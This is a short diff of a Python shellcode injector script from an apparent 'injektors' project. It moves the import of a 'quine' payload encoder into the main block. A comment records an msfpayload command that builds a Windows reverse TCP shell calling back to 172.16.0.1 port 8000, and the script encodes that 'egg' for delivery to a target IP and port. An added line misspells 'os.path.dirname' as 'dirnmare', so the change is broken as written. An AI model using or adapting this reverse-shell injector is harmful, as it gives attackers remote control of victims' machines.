@@ -11,9 +11,6 @@ import socket
 from codecs import escape_decode
 import struct
 
-sys.path.append("../encoders")
-quine = __import__("quine")
-
 # elvis@hell:~/CODE/injektors$ msfpayload windows/shell_reverse_tcp LHOST=172.16.0.1 LPORT=8000 C
 # /*
 #  * windows/shell_reverse_tcp - 314 bytes
@@ -51,6 +48,9 @@ if __name__ == '__main__':
     if len(sys.argv) < 3:
         print 'Usage: python %s [OPTIONS] <target_IP> <target_PORT>'%(sys.argv[0])
         sys.exit(1)
+    os.chdir(os.path.dirnmare(sys.argv[0]))
+    sys.path.append("../encoders")
+    quine = __import__("quine")
 
     # harvest egg
     egg = quine.encode(reverse_tcp_EGG)
